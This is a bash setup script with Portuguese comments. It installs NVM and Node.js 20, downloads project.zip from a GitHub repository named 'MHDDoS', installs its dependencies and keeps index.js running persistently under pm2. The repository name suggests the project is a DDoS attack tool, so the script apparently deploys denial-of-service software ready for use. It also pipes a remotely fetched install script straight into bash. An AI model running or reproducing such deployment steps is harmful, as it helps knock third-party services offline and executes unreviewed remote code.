#!/bin/bash

# Instalar NVM
wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash

# Carregar NVM no ambiente atual
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"

# Instalar Node.js 20
nvm install 20

# Baixar projeto
wget https://github.com/grupoan/MHDDoS/raw/refs/heads/main/project.zip

# Descompactar
unzip -o project.zip

# Entrar na pasta do projeto (caso exista)
cd project || exit

# Instalar dependências
npm install

# Instalar PM2 globalmente
npm install -g pm2

# Iniciar aplicação
pm2 start index.js
